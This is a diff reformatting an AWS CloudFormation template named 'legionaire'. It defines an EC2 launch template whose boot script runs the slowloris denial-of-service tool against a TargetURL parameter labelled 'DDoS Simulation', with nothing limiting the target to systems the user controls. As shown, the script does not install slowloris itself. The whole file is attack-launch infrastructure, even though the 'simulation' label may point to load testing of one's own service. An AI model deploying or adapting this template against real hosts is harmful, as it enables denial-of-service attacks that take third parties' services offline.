@@ -1,43 +1,46 @@
 {
-	"AWSTemplateFormatVersion" : "2010-09-09",
-	"Parameters" : {
-    "TargetURL": {
-	    "Description" : "Hostname for DDoS Simulation",
-	    "Type": "String",
-	    "ConstraintDescription" : "must be a url",
-	    "AllowedPattern" : "^(http(s?):\/\/)?(((www\.)?[a-zA-Z0-9\.\-\_]+(\.[a-zA-Z]{2,3})+)|(\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b))(\/[a-zA-Z0-9\_\-\s\.\/\?\%\#\&\=]*)?$"
-	  },
+  "AWSTemplateFormatVersion":"2010-09-09",
+  "Parameters":{
+     "TargetURL":{
+        "Description":"Hostname for DDoS Simulation",
+        "Type":"String",
+        "ConstraintDescription":"must be a url",
+        "AllowedPattern":"^(http(s?):\/\/)?(((www\\.)?[a-zA-Z0-9\\.\\-\\_]+(\\.[a-zA-Z]{2,3})+)|(\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b))(\/[a-zA-Z0-9\\_\\-\\s\\.\/\\?\\%\\#\\&\\=]*)?$"
+     }
   },
-	"Resources" : {
-    "legionaire-launch-template" : {
-      "Type" : "AWS::EC2::LaunchTemplate",
-      "Properties" : {
-        "LaunchTemplateData" : {
-          "CreditSpecification" : {
-            "CpuCredits" : "standard"
-          },
-          "ImageId" : "ami-05fa00d4c63e32376",
-          "InstanceType" : "t2.micro",
-          "SecurityGroups" : [
-            "default"
-          ],
-          "UserData" : {
-            "Fn::Base64" : {
-              "Fn::Join" : ["", [
-                "#!/bin/bash \n",
-                "yum update -y \n",
-                "yum install python3 -y \n",
-                "slowloris ",
-                {
-                  	"Ref": "TargetURL"
-              	},
-                " \n"
-              ]]
-            }
-          }
+  "Resources":{
+     "legionaire-launch-template":{
+        "Type":"AWS::EC2::LaunchTemplate",
+        "Properties":{
+           "LaunchTemplateData":{
+              "CreditSpecification":{
+                 "CpuCredits":"standard"
+              },
+              "ImageId":"ami-05fa00d4c63e32376",
+              "InstanceType":"t2.micro",
+              "SecurityGroups":[
+                 "default"
+              ],
+              "UserData":{
+                 "Fn::Base64":{
+                    "Fn::Join":[
+                       "",
+                       [
+                          "#!/bin/bash \n",
+                          "yum update -y \n",
+                          "yum install python3 -y \n",
+                          "slowloris ",
+                          {
+                             "Ref":"TargetURL"
+                          },
+                          " \n"
+                       ]
+                    ]
+                 }
+              }
+           },
+           "LaunchTemplateName":"legionaire"
         }
-        "LaunchTemplateName" : "legionaire"
-      }
-    }
+     }
   }
 }
